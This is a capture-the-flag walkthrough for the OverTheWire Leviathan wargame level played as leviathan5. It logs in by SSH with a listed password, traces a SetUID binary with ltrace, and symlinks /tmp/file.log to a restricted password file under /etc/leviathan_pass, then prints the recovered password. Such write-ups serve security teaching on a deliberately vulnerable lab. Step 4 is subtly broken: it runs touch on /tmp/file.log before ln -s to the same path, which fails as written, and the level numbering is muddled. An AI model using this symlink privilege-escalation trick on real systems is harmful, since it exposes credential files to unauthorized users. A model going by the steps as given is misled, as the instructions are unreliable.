# 🐉 OverTheWire Leviathan CTF – Level 6  

## 🌐 **Challenge Description**  
Leviathan is a Linux-based wargame focused on basic Unix commands and privilege escalation.  
👉 Levels can be accessed via SSH on port **2223**.  

---

## 🎯 **Goal**  
- Exploit a symbolic link vulnerability to read a restricted file and retrieve the next password.  

---

## 🌊 **Level 6 Details**  
| **Level** | **Username** | **Password** | **Command to Login** |
|:---------|:-------------|:------------|---------------------|
| Level 6  | leviathan5   | 0dyxT7F4QD   | `ssh leviathan5@leviathan.labs.overthewire.org -p 2223` |

---

## 🚀 **Solution**  

### **Step 1: Connect to the Server**  
Use SSH to connect to the Leviathan server:  

```bash
ssh leviathan5@leviathan.labs.overthewire.org -p 2223
```

- **Username:** `leviathan5`  
- **Password:** `0dyxT7F4QD`  

👉 SSH allows us to securely connect to the server using port **2223**.  

---

### **Step 2: List All Files**  
Once logged in, list all files (including hidden ones):  

```bash
ls -la
```

**Output Example:**

![ls-la](https://github.com/user-attachments/assets/01056f00-2caa-4bb4-93ff-1dec548929a7)


✅ **Findings:**  
- There’s an executable file named **`leviathan5`**.  
- It has **SetUID** permissions, meaning it runs with the privileges of the file owner (in this case, `leviathan6`).  

---

### **Step 3: Analyze the Binary Using `ltrace`**  
Use `ltrace` to analyze system calls:  

```bash
ltrace ./leviathan5
```

**Output Example:**

![ltrace](https://github.com/user-attachments/assets/931bf494-c576-4833-b64b-b3cd5055565a)


✅ **Key Findings:**  
- The program is trying to open `/tmp/file.log` in **read mode**.  
- If we can control `/tmp/file.log`, we can make it point to the next password file.  

---

### **Step 4: Create a Symbolic Link**  
1. First, create an empty `/tmp/file.log` file:  

```bash
touch /tmp/file.log
```

2. Create a symbolic link pointing to the password file:  

```bash
ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
```

3. Confirm the symbolic link was created:  

```bash
ls -la /tmp/file.log
```

✅ **Findings:**  
- `/tmp/file.log` now points to `/etc/leviathan_pass/leviathan6`.  

---

### **Step 5: Execute the Binary**  
Run the binary again:  

```bash
./leviathan5
```

**Output Example:**

![Password](https://github.com/user-attachments/assets/57973ca1-9e63-45ec-9e24-ed5b297e5ca0)


✅ **Success:**  
- The binary reads the symbolic link and outputs the content of `/etc/leviathan_pass/leviathan6` (the password).  

---

### **Step 6: Read the Next Level Password**  
The output is the password for **Leviathan Level 6**.  

---

## ✅ **Password for Leviathan Level 6**  
```bash
szo7HDB88w
```

---

## 🖼️ **Screenshots**  
| Step | Screenshot |  
|------|------------|  
| Step 3 – Using `ltrace` | ![ltrace](https://github.com/user-attachments/assets/931bf494-c576-4833-b64b-b3cd5055565a) |  
| Step 4 – Creating Symbolic Link | ![Password](https://github.com/user-attachments/assets/57973ca1-9e63-45ec-9e24-ed5b297e5ca0) |  

---

## 💡 **Lessons Learned**  
✔️ **Symbolic Link Attack:**  
- The program was reading a fixed file path in `/tmp/`.  
- By creating a symbolic link, we redirected it to the password file.  

✔️ **SetUID Exploit:**  
- The binary executed with elevated privileges due to the **SetUID** bit.  
- This allowed us to access restricted files.  

---

## 🎯 **Next Level**  
Use the password to access **Leviathan Level 6**:  
👉 [http://leviathan.labs.overthewire.org](http://leviathan.labs.overthewire.org)  

---
